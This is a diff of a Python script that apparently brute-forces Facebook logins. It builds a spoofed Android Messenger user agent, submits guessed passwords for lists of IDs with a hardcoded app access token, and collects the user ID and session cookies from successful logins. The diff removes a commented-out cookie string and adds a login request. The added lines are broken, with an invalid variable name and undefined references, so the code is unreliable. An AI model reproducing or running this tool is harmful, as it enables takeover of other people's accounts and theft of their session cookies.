@@ -23,9 +23,8 @@ z \033[1;97m .##.....##..######..##.....##
 \033[1;91m WhatsApp   : 0093702856593     
 \033[1;91m facebook   : Raziqullah
 \033[1;91m Telegram   : Saadat
-\033[1;91m Status     : FREE
- \033[1;97m Raziqullah :Saadat
-            :Raziqullah Saadat
+\033[1;91m Status         : FREE
+ \033[1;97m Version      :0.1
 \033[1;97m--------------------------------------------------
 '''
 loop = 0
@@ -90,11 +89,10 @@ def rndm(ids,mking_pass):
 			fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
 			ua = 'Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+model+' Build/'+build+') [FBAN/Orca-Android;FBAV/'+fbav+';FBBV/'+fbbv+';FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+android_version+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'
 			data ={"locale": "en_GB","format": "json","email": ids,"password": pas,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies": 1}
-			head = {'authority': 'p.facebook.com',
+			header freefb = {'authority': 'p.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
-       # 'cookie': 'datr=Up7EZHEBOq41uJLZ84gHXyOn; sb=Up7EZNaU_dJDMXyNf7KknfAt; m_pixel_ratio=3; locale=en_US; vpd=v1%3B654x360x3; wl_cbv=v2%3Bclient_version%3A2296%3Btimestamp%3A1690607334; wd=360x654; fr=0u7SSeEt1H7XFjUdT.AWWGZGYOZk2--dExV6eIBmap0dY.BkxJ5a.vJ.AAA.0.0.BkxMTD.AWWg0KE94Tk',
           'sec-ch-prefers-color-scheme': 'light',
           'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
           'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
@@ -107,6 +105,7 @@ def rndm(ids,mking_pass):
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',}
+          lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
 			if 'session_key' in po:
 				uid = po['uid']
 				coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
